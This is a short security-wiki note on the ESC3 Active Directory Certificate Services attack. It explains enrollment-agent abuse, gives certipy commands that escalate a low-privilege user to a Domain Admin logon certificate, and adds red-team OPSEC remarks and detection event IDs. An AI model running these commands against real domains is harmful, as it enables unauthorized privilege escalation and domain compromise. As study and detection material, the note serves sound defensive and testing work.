---
title: "ESC3 — Certificate Request Agent (enroll on behalf of)"
type: concept
created: 2026-09-07
updated: 2026-09-07
tags: [active-directory, ad-cs, esc, privilege-escalation]
---

# ESC3

A template with the **Certificate Request Agent** EKU
(`1.3.6.1.4.1.311.20.2.1`) enrollable by a low-priv principal. An **enrollment
agent** cert lets its holder request certificates **on behalf of other users**.
Combine it with a second template that permits enrollment-agent enrollment and
has a client-auth EKU → request a logon cert **as a Domain Admin**.

## Exploit

```bash
# 1. get the enrollment-agent cert
certipy req -u user@corp.local -p 'Pass' -ca CORP-CA -template ESC3Agent
# 2. use it to enrol a logon cert on behalf of a DA
certipy req -u user@corp.local -p 'Pass' -ca CORP-CA -template User \
  -on-behalf-of 'corp\administrator' -pfx user.pfx
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.10
```

## Red-team notes (OPSEC)

- Two issuances instead of one (agent cert + on-behalf cert) — a slightly
  larger CA footprint than [[esc1]]; the on-behalf request is the tell
  (requester = agent, subject = DA).
- Enrollment-agent restrictions on the CA can limit which templates/accounts an
  agent may act for — check with `certipy find`.

## Detection

- Issuance of a **Certificate Request Agent** cert to a normal user, followed
  by an **on-behalf-of** enrollment (AD CS 4886/4887 pairing).

## Links

- [[ad-cs-esc-attacks]], [[certificate-templates]], [[esc1]]
- [[certipy]], [[certified-pre-owned]]
